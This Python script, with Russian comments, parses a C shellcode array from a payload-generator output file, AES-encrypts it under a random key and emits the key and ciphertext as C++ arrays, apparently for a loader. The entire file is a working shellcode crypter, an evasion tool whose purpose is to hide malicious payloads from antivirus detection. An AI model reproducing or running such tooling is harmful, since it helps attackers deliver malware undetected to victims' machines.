from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import os
import re
import sys

def parse_shellcode_from_file(file_content):
    pattern = r'unsigned char buf\[\] = \n"(.*?)";'
    match = re.search(pattern, file_content, re.DOTALL)
    
    if not match:
        raise ValueError("Shellcode not found in the provided file.")
    
    shellcode_str = match.group(1)
    shellcode_str = shellcode_str.replace('\n', '').replace('"', '')
    
    shellcode_bytes = bytes(int(byte, 16) for byte in shellcode_str.split('\\x') if byte)
    return shellcode_bytes

def encrypt_shellcode(shellcode, key):
    # Проверка длины исходного шеллкода
    print(f"Original shellcode length: {len(shellcode)} bytes")
    
    cipher = AES.new(key, AES.MODE_ECB)
    encrypted_shellcode = cipher.encrypt(pad(shellcode, AES.block_size))
    
    # Проверка длины зашифрованного шеллкода
    print(f"Encrypted shellcode length after padding: {len(encrypted_shellcode)} bytes")
    
    return encrypted_shellcode

def format_as_cpp_array(name, data):
    # Форматирование данных в виде C++ массива с указанием длины
    cpp_array = f"BYTE {name}[{len(data)}] = {{\n    "
    cpp_array += ', '.join(f'0x{byte:02x}' for byte in data)
    cpp_array += '\n};\n'
    return cpp_array

def main(input_file, output_file, key):
    with open(input_file, 'r') as f:
        file_content = f.read().strip()
    
    shellcode = parse_shellcode_from_file(file_content)
    encrypted_shellcode = encrypt_shellcode(shellcode, key)
    
    # Проверка длины зашифрованных данных
    print(f"Encrypted shellcode length: {len(encrypted_shellcode)} bytes")
    assert len(encrypted_shellcode) % 16 == 0, "Length of encrypted shellcode is not a multiple of 16 bytes."
    
    key_formatted = format_as_cpp_array("key", key)
    encrypted_shellcode_formatted = format_as_cpp_array("encryptedShellcode", encrypted_shellcode)
    
    with open(output_file, 'w') as f:
        f.write(key_formatted)
        f.write(encrypted_shellcode_formatted)
    
    print(f"Key and encrypted shellcode saved to {output_file}")

if __name__ == '__main__':
    if len(sys.argv) != 3:
        print(f"Usage: {sys.argv[0]} <input_file> <output_file>")
        sys.exit(1)
    
    input_file = sys.argv[1]
    output_file = sys.argv[2]
    
    key = os.urandom(32)
    main(input_file, output_file, key)
